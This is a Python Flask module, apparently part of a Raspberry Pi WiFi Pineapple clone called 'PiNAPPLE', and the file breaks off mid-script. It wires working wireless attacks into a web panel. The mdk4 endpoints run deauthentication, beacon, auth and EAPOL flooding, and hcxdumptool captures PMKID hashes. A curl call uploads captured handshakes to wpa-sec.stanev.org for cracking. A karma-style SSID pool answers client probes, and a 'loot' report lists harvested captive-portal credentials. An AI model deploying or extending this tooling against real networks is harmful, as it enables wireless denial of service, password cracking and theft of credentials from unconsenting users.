#!/usr/bin/env python3
# PiNAPPLE Extensions: PineAP Suite, Loot Manager, Campaigns
from ext_helpers import (sysinfo, load_ssid_pool, save_ssid_pool,
    load_filter_list, save_filter_list, load_pineap_cfg, save_pineap_cfg,
    get_pineap_events, loot_list, _proc_running, _kill_proc,
    PINEAP_CFG, SSID_POOL, ALLOW_MAC_F, DENY_MAC_F, ALLOW_SSID_F, DENY_SSID_F,
    PINEAP_LOG, LOOT_DIR, CAMPAIGNS_DIR, MDK4_PID, PMKID_PID,
    _mdk4_proc, _pmkid_proc)


def register_extensions(app):
    import os, json, time, glob, re, subprocess, threading, shutil
    from flask import request, jsonify, Response
    from app import (page, require_auth, service_status, get_clients, get_creds,
                     get_recon, get_probes, read_hostapd_conf,
                     LOG_DIR, BEACON_SSIDS, BEACON_PID, _beacon_proc)

    @app.route('/api/sysinfo')
    @require_auth
    def api_sysinfo():
        return jsonify(sysinfo())

    @app.route('/api/pineap/service', methods=['POST'])
    @require_auth
    def api_pineap_service():
        action = (request.json or {}).get('action', 'start')
        r = subprocess.run(['systemctl', action, 'pinapple-pineap'],
                           capture_output=True, text=True)
        ok = r.returncode == 0
        return jsonify({'ok': ok, 'msg': ('PineAP ' + action + 'd') if ok else r.stderr.strip()})

    @app.route('/api/pineap/config', methods=['GET', 'POST'])
    @require_auth
    def api_pineap_config():
        cfg = load_pineap_cfg()
        if request.method == 'POST':
            cfg.update(request.json or {})
            save_pineap_cfg(cfg)
            return jsonify({'ok': True, 'config': cfg})
        return jsonify(cfg)

    @app.route('/api/pineap/ssid-pool', methods=['GET', 'POST'])
    @require_auth
    def api_ssid_pool():
        if request.method == 'POST':
            ssid = (request.json or {}).get('ssid', '').strip()
            if not ssid:
                return jsonify({'ok': False, 'error': 'ssid required'})
            pool = load_ssid_pool()
            if ssid not in pool:
                pool.append(ssid)
            if len(pool) > 64:
                pool = pool[-64:]
            save_ssid_pool(pool)
            return jsonify({'ok': True, 'count': len(pool)})
        return jsonify({'ssids': load_ssid_pool()})

    @app.route('/api/pineap/ssid-pool/delete', methods=['POST'])
    @require_auth
    def api_ssid_pool_delete():
        ssid = (request.json or {}).get('ssid', '').strip()
        pool = [s for s in load_ssid_pool() if s != ssid]
        save_ssid_pool(pool)
        return jsonify({'ok': True, 'count': len(pool)})

    @app.route('/api/pineap/filter', methods=['POST'])
    @require_auth
    def api_filter_add():
        d = request.json or {}
        ftype = d.get('ftype', '')
        value = d.get('value', '').strip().upper()
        paths = {'allow_mac': ALLOW_MAC_F, 'deny_mac': DENY_MAC_F,
                 'allow_ssid': ALLOW_SSID_F, 'deny_ssid': DENY_SSID_F}
        if ftype not in paths or not value:
            return jsonify({'ok': False, 'error': 'invalid'})
        items = load_filter_list(paths[ftype])
        if value not in items:
            items.append(value)
            save_filter_list(paths[ftype], items)
        return jsonify({'ok': True})

    @app.route('/api/pineap/filter/delete', methods=['POST'])
    @require_auth
    def api_filter_delete():
        d = request.json or {}
        ftype = d.get('ftype', '')
        value = d.get('value', '').strip().upper()
        paths = {'allow_mac': ALLOW_MAC_F, 'deny_mac': DENY_MAC_F,
                 'allow_ssid': ALLOW_SSID_F, 'deny_ssid': DENY_SSID_F}
        if ftype not in paths:
            return jsonify({'ok': False, 'error': 'invalid ftype'})
        items = [i for i in load_filter_list(paths[ftype]) if i != value]
        save_filter_list(paths[ftype], items)
        return jsonify({'ok': True})

    @app.route('/api/pineap/filters')
    @require_auth
    def api_filters_all():
        return jsonify({'allow_mac': load_filter_list(ALLOW_MAC_F),
                        'deny_mac':  load_filter_list(DENY_MAC_F),
                        'allow_ssid': load_filter_list(ALLOW_SSID_F),
                        'deny_ssid': load_filter_list(DENY_SSID_F)})

    @app.route('/api/pineap/events')
    @require_auth
    def api_pineap_events():
        return jsonify(get_pineap_events(100))

    @app.route('/api/mdk4/start', methods=['POST'])
    @require_auth
    def api_mdk4_start():
        d = request.json or {}
        mode = d.get('mode', 'd')
        iface = d.get('iface', 'wlan1')
        run, _ = _proc_running(_mdk4_proc, MDK4_PID)
        if run:
            _kill_proc(_mdk4_proc, MDK4_PID)
        mdk4_bin = '/usr/sbin/mdk4'
        if mode == 'd':
            target = d.get('target', '')
            cmd = [mdk4_bin, iface, 'd']
            if target:
                cmd += ['--bssid', target]
        elif mode == 'b':
            ssids = d.get('ssids', ['Free WiFi'])
            sf = '/tmp/mdk4_ssids.txt'
            with open(sf, 'w') as fh:
                fh.write('\n'.join(ssids[:100]))
            cmd = [mdk4_bin, iface, 'b', '-f', sf, '-s', '100']
        elif mode == 'a':
            bssid = d.get('bssid', '')
            cmd = [mdk4_bin, iface, 'a']
            if bssid:
                cmd += ['-a', bssid]
        elif mode == 'e':
            bssid = d.get('bssid', '')
            cmd = [mdk4_bin, iface, 'e']
            if bssid:
                cmd += ['-t', bssid]
        else:
            return jsonify({'ok': False, 'error': 'unknown mode'})
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            _mdk4_proc[0] = proc
            with open(MDK4_PID, 'w') as fh:
                fh.write(str(proc.pid))
            return jsonify({'ok': True, 'pid': proc.pid, 'mode': mode})
        except Exception as e:
            return jsonify({'ok': False, 'error': str(e)})

    @app.route('/api/mdk4/stop', methods=['POST'])
    @require_auth
    def api_mdk4_stop():
        _kill_proc(_mdk4_proc, MDK4_PID)
        return jsonify({'ok': True})

    @app.route('/api/mdk4/status')
    @require_auth
    def api_mdk4_status():
        run, pid = _proc_running(_mdk4_proc, MDK4_PID)
        return jsonify({'running': run, 'pid': pid})

    @app.route('/api/pmkid/start', methods=['POST'])
    @require_auth
    def api_pmkid_start():
        d = request.json or {}
        target = d.get('bssid', '').strip()
        run, _ = _proc_running(_pmkid_proc, PMKID_PID)
        if run:
            _kill_proc(_pmkid_proc, PMKID_PID)
        os.makedirs(LOOT_DIR, exist_ok=True)
        stamp = time.strftime('%Y%m%d_%H%M%S')
        out_f = os.path.join(LOOT_DIR, 'pmkid_' + stamp + '.pcapng')
        subprocess.run(['iw', 'dev', 'wlan1', 'set', 'type', 'monitor'],
                       capture_output=True)
        cmd = ['hcxdumptool', '-i', 'wlan1', '-o', out_f,
               '--enable_status=1', '--disable_client_attacks']
        if target:
            filt = '/tmp/pmkid_target.txt'
            with open(filt, 'w') as fh:
                fh.write(target.replace(':', '') + '\n')
            cmd += ['--filterlist_ap=' + filt, '--filtermode=2']
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            _pmkid_proc[0] = proc
            with open(PMKID_PID, 'w') as fh:
                fh.write(str(proc.pid))
            return jsonify({'ok': True, 'pid': proc.pid, 'output': out_f})
        except Exception as e:
            return jsonify({'ok': False, 'error': str(e)})

    @app.route('/api/pmkid/stop', methods=['POST'])
    @require_auth
    def api_pmkid_stop():
        _kill_proc(_pmkid_proc, PMKID_PID)
        subprocess.run(['/usr/local/bin/pinapple-monitor', 'start'],
                       capture_output=True)
        files = sorted(glob.glob(os.path.join(LOOT_DIR, 'pmkid_*.pcapng')))
        converted = None
        if files:
            latest = files[-1]
            out22k = latest.replace('.pcapng', '.22000')
            r = subprocess.run(['hcxpcapngtool', '-o', out22k, latest],
                               capture_output=True, text=True)
            if r.returncode == 0 and os.path.exists(out22k):
                converted = os.path.basename(out22k)
        return jsonify({'ok': True, 'converted': converted})

    @app.route('/api/pmkid/status')
    @require_auth
    def api_pmkid_status():
        run, pid = _proc_running(_pmkid_proc, PMKID_PID)
        files = sorted(glob.glob(os.path.join(LOOT_DIR, 'pmkid_*')))
        return jsonify({'running': run, 'pid': pid,
                        'files': [os.path.basename(f) for f in files]})

    @app.route('/api/loot/download/<filename>')
    @require_auth
    def api_loot_download(filename):
        if not re.match(r'^[\w\-\.]+$', filename):
            return Response('Invalid', 403)
        for base in [LOOT_DIR, LOG_DIR]:
            fp = os.path.join(base, filename)
            if os.path.isfile(fp):
                with open(fp, 'rb') as fh:
                    data = fh.read()
                return Response(data, mimetype='application/octet-stream',
                                headers={'Content-Disposition':
                                         'attachment; filename=' + filename})
        return Response('Not found', 404)

    @app.route('/api/loot/delete', methods=['POST'])
    @require_auth
    def api_loot_delete():
        filename = (request.json or {}).get('name', '')
        if not re.match(r'^[\w\-\.]+$', filename):
            return jsonify({'ok': False, 'error': 'invalid'})
        for base in [LOOT_DIR, LOG_DIR]:
            fp = os.path.join(base, filename)
            if os.path.isfile(fp):
                os.remove(fp)
                return jsonify({'ok': True})
        return jsonify({'ok': False, 'error': 'not found'})

    @app.route('/api/loot/wpasec', methods=['POST'])
    @require_auth
    def api_wpasec_upload():
        d = request.json or {}
        key = d.get('key', '').strip()
        name = d.get('filename', '').strip()
        if not key or not name:
            return jsonify({'ok': False, 'error': 'key and filename required'})
        if not re.match(r'^[\w\-\.]+$', name):
            return jsonify({'ok': False, 'error': 'invalid filename'})
        fp = None
        for base in [LOOT_DIR, LOG_DIR]:
            p = os.path.join(base, name)
            if os.path.isfile(p):
                fp = p
                break
        if not fp:
            return jsonify({'ok': False, 'error': 'file not found'})
        try:
            subprocess.run(['curl', '-s', '-F', 'sta=' + key,
                            '-F', 'cap=@' + fp,
                            'https://wpa-sec.stanev.org/?submit'],
                           capture_output=True, timeout=30)
            return jsonify({'ok': True, 'msg': 'Uploaded! Check wpa-sec.stanev.org'})
        except Exception as e:
            return jsonify({'ok': False, 'error': str(e)})

    @app.route('/api/loot/report', methods=['POST'])
    @require_auth
    def api_loot_report():
        os.makedirs(LOOT_DIR, exist_ok=True)
        ts = time.strftime('%Y%m%d_%H%M%S')
        fname = 'report_' + ts + '.html'
        fpath = os.path.join(LOOT_DIR, fname)
        clients = get_clients()
        creds = get_creds()
        networks = get_recon()
        probes = get_probes()
        ap_cfg = read_hostapd_conf()
        pcaps = [f for f in loot_list() if f['ext'] in ('pcap', 'cap')]
        pmkids = [f for f in loot_list() if f['ext'] == '22000']

        def tr(cols):
            return '<tr>' + ''.join('<td>' + str(c) + '</td>' for c in cols) + '</tr>'

        cred_rows = ''.join(tr([e.get('timestamp', ''), e.get('client_ip', ''),
            e.get('client_mac', ''), e.get('portal_type', ''),
            json.dumps(e.get('data', {}))]) for e in creds) or \
            '<tr><td colspan=5>None</td></tr>'
        net_rows = ''.join(tr([n.get('ssid', ''), n.get('bssid', ''),
            n.get('channel', ''), str(n.get('signal', '')) + ' dBm',
            n.get('encryption', '')])
            for n in sorted(networks, key=lambda x: x.get('signal', 0), reverse=True)
        ) or '<tr><td colspan=5>None</td></tr>'
        prb_rows = ''.join(tr([p.get('mac', ''), p.get('ssid', ''),
            str(p.get('count', 1)), p.get('last_seen', '')])
            for p in probes[:50]) or '<tr><td colspan=4>None</td></tr>'
        cap_rows = ''.join(tr([f['name'], str(f['size']) + ' bytes', f['mtime']])
            for f in pcaps) or '<tr><td colspan=3>None</td></tr>'
        pmk_rows = ''.join(tr([f['name'], str(f['size']) + ' bytes', f['mtime']])
            for f in pmkids) or '<tr><td colspan=3>None</td></tr>'

        parts = [
            '<!DOCTYPE html><html><head><meta charset=UTF-8>',
            '<title>PiNAPPLE Report ' + ts + '</title>',
            '<style>',
            'body{font-family:sans-serif;background:#f5f5f5;color:#333;padding:32px}',
            'h1{color:#00d4aa}h2{color:#0099ff;margin-top:24px}',
            '.stats{display:flex;gap:16px;flex-wrap:wrap;margin:16px 0}',
            '.stat{background:white;border-radius:8px;padding:16px;text-align:center;min-width:120px}',
            '.stat .n{font-size:2rem;font-weight:700;color:#00d4aa}',
            'table{width:100%;border-collapse:collapse;background:white;',
            'border-radius:8px;margin:8px 0}',
            'th{background:#f0f0f0;padding:10px;text-align:left;font-size:0.8rem;color:#666}',
            'td{padding:8px 10px;border-bottom:1px solid #eee;font-size:0.875rem}',
            '</style></head><body>',
            '<h1>PiNAPPLE Audit Report</h1>',
            '<p>Generated: ' + time.strftime('%Y-%m-%d %H:%M:%S') + ' | AP SSID: ' +
            ap_cfg.get('ssid', '?') + ' | Channel: ' + str(ap_cfg.get('channel', '?')) + '</p>',
            '<div class=stats>',
            '<div class=stat><div class=n>' + str(len(clients)) + '</div>Clients</div>',
            '<div class=stat><div class=n>' + str(len(creds)) + '</div>Credentials</div>',
            '<div class=stat><div class=n>' + str(len(networks)) + '</div>Networks</div>',
            '<div class=stat><div class=n>' + str(len(probes)) + '</div>Probes</div>',
            '<div class=stat><div class=n>' + str(len(pcaps)) + '</div>Handshakes</div>',
            '</div>',
            '<h2>Credentials</h2>',
            '<table><tr><th>Time</th><th>IP</th><th>MAC</th><th>Type</th><th>Data</th></tr>',
            cred_rows, '</table>',
            '<h2>Networks (' + str(len(networks)) + ')</h2>',
            '<table><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Signal</th><th>Enc</th></tr>',
            net_rows, '</table>',
            '<h2>Probe Requests (' + str(len(probes)) + ')</h2>',
            '<table><tr><th>MAC</th><th>SSID</th><th>Count</th><th>Last Seen</th></tr>',
            prb_rows, '</table>',
            '<h2>Handshakes</h2>',
            '<table><tr><th>File</th><th>Size</th><th>Modified</th></tr>',
            cap_rows, '</table>',
            '<h2>PMKID Hashes</h2>',
            '<table><tr><th>File</th><th>Size</th><th>Modified</th></tr>',
            pmk_rows, '</table>',
            '<p style="margin-top:24px;color:#999;font-size:0.8rem">',
            'PiNAPPLE - authorized use only</p></body></html>',
        ]
        with open(fpath, 'w') as fh:
            fh.write(''.join(parts))
        return jsonify({'ok': True, 'filename': fname})

    @app.route('/api/recon/add-to-pool', methods=['POST'])
    @require_auth
    def api_recon_add_pool():
        ssid = (request.json or {}).get('ssid', '').strip()
        if not ssid:
            return jsonify({'ok': False, 'error': 'ssid required'})
        pool = load_ssid_pool()
        if ssid not in pool:
            pool.append(ssid)
            save_ssid_pool(pool)
        return jsonify({'ok': True, 'pool_size': len(pool)})

    # ── PineAP PAGE ───────────────────────────────────────────────────────────
    @app.route('/pineap')
    @require_auth
    def pineap_page():
        cfg = load_pineap_cfg()
        pool = load_ssid_pool()
        allow_mac  = load_filter_list(ALLOW_MAC_F)
        deny_mac   = load_filter_list(DENY_MAC_F)
        allow_ssid = load_filter_list(ALLOW_SSID_F)
        deny_ssid  = load_filter_list(DENY_SSID_F)
        pineap_svc = service_status('pinapple-pineap')
        events = get_pineap_events(50)

        def tog(key, val):
            cls = 'ton' if val else 'toff'
            txt = 'ON' if val else 'OFF'
            return ('<button class="tbtn ' + cls + '" '
                    "onclick=\"togPA('" + key + "',this)\">" + txt + '</button>')

        mode_opts = ''
        for v, label in [('passive', 'Passive (log probes only)'),
                          ('active', 'Active (respond to all probes)'),
                          ('advanced', 'Advanced')]:
            sel = ' selected' if cfg['mode'] == v else ''
            mode_opts += '<option value="' + v + '"' + sel + '>' + label + '</option>'

        pool_rows = ''
        for s in pool:
            se = s.replace("'", "\\'").replace('"', '&quot;')
            pool_rows += ('<tr><td>' + s + '</td><td>'
                          "<button onclick=\"delPool('" + se + "')\" "
                          'class="btn btn-danger" style="padding:3px 10px;font-size:0.75rem">'
                          '&#10005;</button></td></tr>')
        if not pool_rows:
            pool_rows = '<tr><td colspan=2 style="color:var(--dim)">Empty pool</td></tr>'

        def flist_html(items, ftype, badge):
            if not items:
                return '<div style="color:var(--dim);font-size:0.8rem">None</div>'
            h = ''
            for item in items:
                ie = item.replace("'", "\\'")
                h += ('<div style="display:flex;align-items:center;gap:6px;margin-bottom:4px">'
                      '<span class="badge ' + badge + '">' + item + '</span>'
                      "<button onclick=\"delFilter('" + ftype + "','" + ie + "')\" "
                      'style="background:none;border:none;color:var(--red);cursor:pointer">'
                      '&#10005;</button></div>')
            return h

        ev_rows = ''
        for e in events:
            bc = 'bb' if e.get('event') == 'probe_req' else 'bg'
            responded = '&#10003;' if e.get('responded') else ''
            ev_rows += ('<tr>'
                        '<td style="font-size:0.75rem;color:var(--dim)">'
                        + e.get('ts', '') + '</td>'
                        '<td><span class="badge ' + bc + '">'
                        + e.get('event', '') + '</span></td>'
                        '<td><code style="font-size:0.75rem">'
                        + e.get('mac', '') + '</code></td>'
                        '<td style="color:var(--acc)">' + e.get('ssid', '') + '</td>'
                        '<td style="text-align:center">' + responded + '</td></tr>')
        if not ev_rows:
            ev_rows = ('<tr><td colspan=5 style="text-align:center;color:var(--dim)">'
                       'No events yet</td></tr>')

        svc_badge = 'bg' if pineap_svc else 'br'
        svc_label = 'Running' if pineap_svc else 'Stopped'

        c = (
            '<div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:20px">'
            '<div><div class="sh"><span class="st">PineAP Engine</span>'
            '<span class="badge ' + svc_badge + '">' + svc_label + '</span></div>'
            '<div class="card">'
            '<div style="display:flex;gap:8px;margin-bottom:16px">'
            "<button class=\"btn btn-acc\" onclick=\"svcctl('start')\">&#9654; Start</button>"
            "<button class=\"btn btn-danger\" onclick=\"svcctl('stop')\">&#9632; Stop</button>"
            "<button class=\"btn btn-outline\" onclick=\"svcctl('restart')\">&#8635; Restart</button>"
            '</div><div id="svc-msg" style="font-size:0.8rem;color:var(--acc)"></div>'
            '<hr style="border-color:var(--bdr);margin:16px 0">'
            '<div class="fg" style="margin-bottom:12px"><label>Mode</label>'
            '<select id="pa-mode" style="background:var(--bg);border:1px solid var(--bdr);'
            'color:var(--txt);padding:10px 14px;border-radius:8px;font-size:0.875rem">'
            + mode_opts + '</select></div>'
            '<div class="tg" style="margin-bottom:8px"><div class="tl">'
            '<strong>Beacon Response</strong><span>Reply to probes with our BSSID</span></div>'
            + tog('beacon_response', cfg['beacon_response']) + '</div>'
            '<div class="tg" style="margin-bottom:8px"><div class="tl">'
            '<strong>Log Probes</strong><span>Record probe requests to log</span></div>'
            + tog('log_probes', cfg['log_probes']) + '</div>'
            '<div class="tg" style="margin-bottom:8px"><div class="tl">'
            '<strong>Auto-Add to Pool</strong><span>Collect probed SSIDs automatically</span></div>'
            + tog('auto_add_to_pool', cfg['auto_add_to_pool']) + '</div>'
            '<button class="btn btn-acc" onclick="saveMode()" style="margin-top:8px">'
            'Save Mode</button></div></div>'

            '<div><div class="sh"><span class="st">SSID Pool ('
            + str(len(pool)) + ' SSIDs)</span></div>'
            '<div class="card">'
            '<div style="max-height:200px;overflow-y:auto;margin-bottom:12px">'
            '<table style="width:100%"><tbody id="pool-tbody">'
            + pool_rows + '</tbody></table></div>'
            '<div style="display:flex;gap:8px;margin-bottom:8px">'
            '<input id="ssid-add-inp" placeholder="New SSID" '
            'style="flex:1;background:var(--bg);border:1px solid var(--bdr);'
            'color:var(--txt);padding:8px 12px;border-radius:6px;font-size:0.875rem">'
            '<button class="btn btn-acc" onclick="addPool()">Add</button></div>'
            '<div style="display:flex;gap:8px">'
            '<button class="btn btn-outline" onclick="importProbes()">&#8594; From Probes</button>'
            '<button class="btn btn-outline" onclick="importRecon()">&#8594; From Recon</button></div>'
            '<div id="pool-msg" style="margin-top:8px;font-size:0.8rem;color:var(--acc)"></div>'
            '</div></div></div>'

            '<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:20px">'
            '<div class="card"><div class="card-title" style="color:var(--grn)">Allow MAC</div>'
            '<div id="allow-mac-list" style="min-height:60px;margin:8px 0">'
            + flist_html(allow_mac, 'allow_mac', 'bg') + '</div>'
            '<div style="display:flex;gap:4px">'
            '<input id="allow-mac-inp" placeholder="AA:BB:CC..." '
            'style="flex:1;background:var(--bg);border:1px solid var(--bdr);'
            'color:var(--txt);padding:6px 8px;border-radius:6px;font-size:0.75rem">'
            "<button class=\"btn btn-acc\" style=\"padding:4px 10px\" "
            "onclick=\"addFilter('allow_mac')\">+</button></div></div>"

            '<div class="card"><div class="card-title" style="color:var(--red)">Deny MAC</div>'
            '<div id="deny-mac-list" style="min-height:60px;margin:8px 0">'
            + flist_html(deny_mac, 'deny_mac', 'br') + '</div>'
            '<div style="display:flex;gap:4px">'
            '<input id="deny-mac-inp" placeholder="AA:BB:CC..." '
            'style="flex:1;background:var(--bg);border:1px solid var(--bdr);'
            'color:var(--txt);padding:6px 8px;border-radius:6px;font-size:0.75rem">'
            "<button class=\"btn btn-danger\" style=\"padding:4px 10px\" "
            "onclick=\"addFilter('deny_mac')\">+</button></div></div>"

            '<div class="card"><div class="card-title" style="color:var(--grn)">Allow SSID</div>'
            '<div id="allow-ssid-list" style="min-height:60px;margin:8px 0">'
            + flist_html(allow_ssid, 'allow_ssid', 'bg') + '</div>'
            '<div style="display:flex;gap:4px">'
            '<input id="allow-ssid-inp" placeholder="SSID" '
            'style="flex:1;background:var(--bg);border:1px solid var(--bdr);'
            'color:var(--txt);padding:6px 8px;border-radius:6px;font-size:0.75rem">'
            "<button class=\"btn btn-acc\" style=\"padding:4px 10px\" "
            "onclick=\"addFilter('allow_ssid')\">+</button></div></div>"

            '<div class="card"><div class="card-title" style="color:var(--red)">Deny SSID</div>'
            '<div id="deny-ssid-list" style="min-height:60px;margin:8px 0">'
            + flist_html(deny_ssid, 'deny_ssid', 'br') + '</div>'
            '<div style="display:flex;gap:4px">'
            '<input id="deny-ssid-inp" placeholder="SSID" '
            'style="flex:1;background:var(--bg);border:1px solid var(--bdr);'
            'color:var(--txt);padding:6px 8px;border-radius:6px;font-size:0.75rem">'
            "<button class=\"btn btn-danger\" style=\"padding:4px 10px\" "
            "onclick=\"addFilter('deny_ssid')\">+</button></div></div></div>"

            '<div class="sh"><span class="st">PineAP Events (last 50)</span>'
            '<button class="btn btn-outline" onclick="refreshEvents()" '
            'style="font-size:0.75rem">&#8635; Refresh</button></div>'
            '<div class="twrap"><table><thead><tr>'
            '<th>Time</th><th>Event</th><th>MAC</th><th>SSID</th><th>Responded</th>'
            '</tr></thead><tbody id="events-tbody">' + ev_rows + '</tbody></table></div>'
        )

        js = ('<script>'
              'async function svcctl(a){'
              'const r=await api("/api/pineap/service","POST",{action:a});'
              'const m=document.getElementById("svc-msg");'
              'm.textContent=r.msg||r.error||"";setTimeout(()=>m.textContent="",3000);}'
              'async function saveMode(){'
              'const mode=document.getElementById("pa-mode").value;'
              'await api("/api/pineap/config","POST",{mode});'
              'document.getElementById("svc-msg").textContent="Saved";'
              'setTimeout(()=>document.getElementById("svc-msg").textContent="",2000);}'
              'async function togPA(key,btn){'
              'const on=btn.classList.contains("ton");'
              'const body={};body[key]=!on;'
              'const r=await api("/api/pineap/config","POST",body);'
              'if(r.ok){btn.textContent=on?"OFF":"ON";'
              'btn.className="tbtn "+(on?"toff":"ton");}}'
              'async function addPool(){'
              'const v=document.getElementById("ssid-add-inp").value.trim();if(!v)return;'
              'await api("/api/pineap/ssid-pool","POST",{ssid:v});'
              'document.getElementById("ssid-add-inp").value="";refreshPool();}'
              'async function delPool(ssid){'
              'await api("/api/pineap/ssid-pool/delete","POST",{ssid});refreshPool();}'
              'async function refreshPool(){'
              'const r=await fetch("/api/pineap/ssid-pool");const d=await r.json();'
              'const tb=document.getElementById("pool-tbody");'
              'if(!d.ssids.length){tb.innerHTML="<tr><td colspan=2>Empty</td></tr>";return;}'
              'tb.innerHTML=d.ssids.map(s=>"<tr><td>"+s+"</td><td>"'
              '+"<button onclick=\\"delPool(\'"+s+"\')\\" class=\\"btn btn-danger\\" '
              'style=\\"padding:3px 10px;font-size:0.75rem\\">&#10005;</button></td></tr>").join("");}'
              'async function importProbes(){'
              'const d=await(await fetch("/api/probes")).json();'
              'for(const p of d)if(p.ssid)await api("/api/pineap/ssid-pool","POST",{ssid:p.ssid});'
              'document.getElementById("pool-msg").textContent="Imported from probes";refreshPool();}'
              'async function importRecon(){'
              'const d=await(await fetch("/api/recon")).json();'
              'for(const n of d)if(n.ssid)await api("/api/pineap/ssid-pool","POST",{ssid:n.ssid});'
              'document.getElementById("pool-msg").textContent="Imported from recon";refreshPool();}'
              'async function addFilter(ftype){'
              'const id=ftype.replace(/_/g,"-")+"-inp";'
              'const inp=document.getElementById(id);'
              'const v=inp.value.trim().toUpperCase();if(!v)return;'
              'await api("/api/pineap/filter","POST",{ftype:ftype,value:v});inp.value="";refreshFilters();}'
              'async function delFilter(ft,val){'
              'await api("/api/pineap/filter/delete","POST",{ftype:ft,value:val});refreshFilters();}'
              'async function refreshFilters(){'
              'const d=await(await fetch("/api/pineap/filters")).json();'
              'const cols={allow_mac:"bg",deny_mac:"br",allow_ssid:"bg",deny_ssid:"br"};'
              'for(const ft of Object.keys(d)){'
              'const el=document.getElementById(ft.replace(/_/g,"-")+"-list");if(!el)continue;'
              'el.innerHTML=d[ft].map(i=>"<div style=\\"display:flex;gap:6px;margin-bottom:4px\\">"'
              '+"<span class=\\"badge "+cols[ft]+"\\">"+i+"</span>"'
              '+"<button onclick=\\"delFilter(\'"+ft+"\',\'"+i+"\')\\" '
              'style=\\"background:none;border:none;color:var(--red);cursor:pointer\\">&#10005;</button>"'
              '+"</div>").join("")||"<div style=\\"color:var(--dim)\\">None</div>";}}'
              'async function refreshEvents(){'
              'const d=await(await fetch("/api/pineap/events")).json();'
              'const tb=document.getElementById("events-tbody");'
              'tb.innerHTML=d.map(e=>"<tr>"'
              '+"<td style=\\"font-size:0.75rem;color:var(--dim)\\">"+e.ts+"</td>"'
              '+"<td><span class=\\"badge "+(e.event==="probe_req"?"bb":"bg")+"\\">"+e.event+"</span></td>"'
              '+"<td><code style=\\"font-size:0.75rem\\">"+e.mac+"</code></td>"'
              '+"<td style=\\"color:var(--acc)\\">"+e.ssid+"</td>"'
              '+"<td style=\\"text-align:center\\">"+(e.responded?"&#10003;":"")+"</td></tr>"'
              ').join("")||"<tr><td colspan=5 style=\\"text-align:center;color:var(--dim)\\">No events</td></tr>";}'
              'setInterval(refreshEvents,5000);'
              '</script>')
        return page('PineAP Suite', c, 'pineap', js)

    # ── LOOT PAGE ─────────────────────────────────────────────────────────────
    @app.route('/loot')
    @require_auth
    def loot_page():
        os.makedirs(LOOT_DIR, exist_ok=True)
        files = loot_list()
        ext_badge = {'pcap':'bb','pcapng':'bb','cap':'bb','22000':'bw','hccapx':'bw',
                     'html':'bg','json':'bg','csv':'bg','txt':'ld'}
        def sz(n):
            if n < 1024: return str(n)+'B'
            if n < 1048576: return str(n//1024)+'KB'
            return str(n//1048576)+'MB'
        rows = ''
        for f in files:
            bc = ext_badge.get(f['ext'], 'br')
            fn = f['name'].replace("'", "\\'")
            row = '<tr>'
            row += '<td><code style="font-size:0.8rem">'+f['name']+'</code></td>'
            row += '<td><span class="badge '+bc+'">'+f['ext']+'</span></td>'
            row += '<td style="font-size:0.8rem">'+sz(f['size'])+'</td>'
            row += '<td style="font-size:0.75rem;color:var(--dim)">'+f['mtime']+'</td>'
            row += '<td style="white-space:nowrap">'
            row += '<a href="/api/loot/download/'+f['name']+'" class="btn btn-outline" style="padding:4px 10px;font-size:0.75rem;margin-right:4px">&#8681; Download</a>'
            row += '<button onclick="delLoot(\''  + fn + '\')" class="btn btn-danger" style="padding:4px 10px;font-size:0.75rem">&#10005;</button>'
            row += '</td></tr>'
            rows += row
        if not rows:
            rows = '<tr><td colspan=5 style="text-align:center;color:var(--dim)">No loot files yet</td></tr>'
        pcap_opts = ''.join('<option value="'+f['name']+'">'+f['name']+'</option>'
                            for f in files if f['ext'] in ('pcap','cap'))
        c = '<div class="sh"><span class="st">Loot Files ('+str(len(files))+')</span>'
        c += '<div style="display:flex;gap:8px">'
        c += '<button class="btn btn-acc" onclick="genReport()">&#128196; Generate Report</button>'
        c += '<button class="btn btn-outline" onclick="location.reload()">&#8635; Refresh</button>'
        c += '</div></div>'
        c += '<div class="twrap"><table><thead><tr>'
        c += '<th>Filename</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th>'
        c += '</tr></thead><tbody>'+rows+'</tbody></table></div>'
        c += '<div id="loot-msg" style="margin-top:12px;font-size:0.875rem;color:var(--acc)"></div>'
        c += '<div style="margin-top:24px">'
        c += '<div class="sh"><span class="st">Upload to WPA-Sec</span>'
        c += '<span style="font-size:0.75rem;color:var(--dim)">Free cloud GPU cracking</span></div>'
        c += '<div class="card" style="max-width:540px">'
        c += '<p style="font-size:0.8rem;color:var(--dim);margin-bottom:14px;line-height:1.6">'
        c += 'Register at <strong>wpa-sec.stanev.org</strong> for a free key. Upload .pcap/.cap for WPA cracking.</p>'
        c += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px">'
        c += '<div class="fg"><label>WPA-Sec API Key</label>'
        c += '<input id="wpasec-key" placeholder="Your wpa-sec key"></div>'
        c += '<div class="fg"><label>File (.pcap/.cap)</label>'
        c += '<select id="wpasec-file"><option value="">-- select --</option>'+pcap_opts+'</select></div>'
        c += '</div>'
        c += '<button class="btn btn-acc" onclick="uploadWpaSec()">&#8679; Upload to WPA-Sec</button>'
        c += '<div id="wpasec-msg" style="margin-top:8px;font-size:0.8rem;color:var(--acc)"></div>'
        c += '</div></div>'
        js = '<script>'
        js += 'async function delLoot(name){if(!confirm("Delete "+name+"?"))return;'
        js += 'const r=await api("/api/loot/delete","POST",{name:name});'
        js += 'document.getElementById("loot-msg").textContent=r.ok?"Deleted: "+name:r.error;'
        js += 'if(r.ok)location.reload();}'
        js += 'async function uploadWpaSec(){'
        js += 'const key=document.getElementById("wpasec-key").value.trim();'
        js += 'const file=document.getElementById("wpasec-file").value;'
        js += 'if(!key||!file){alert("Select a file and enter your WPA-Sec key");return;}'
        js += 'document.getElementById("wpasec-msg").textContent="Uploading...";'
        js += 'const r=await api("/api/loot/wpasec","POST",{key:key,filename:file});'
        js += 'const m=document.getElementById("wpasec-msg");'
        js += 'm.textContent=r.msg||r.error;'
        js += 'if(r.ok)m.style.color="var(--grn)";else m.style.color="var(--red)";}'
        js += 'async function genReport(){'
        js += 'document.getElementById("loot-msg").textContent="Generating report...";'
        js += 'const r=await api("/api/loot/report","POST",{});'
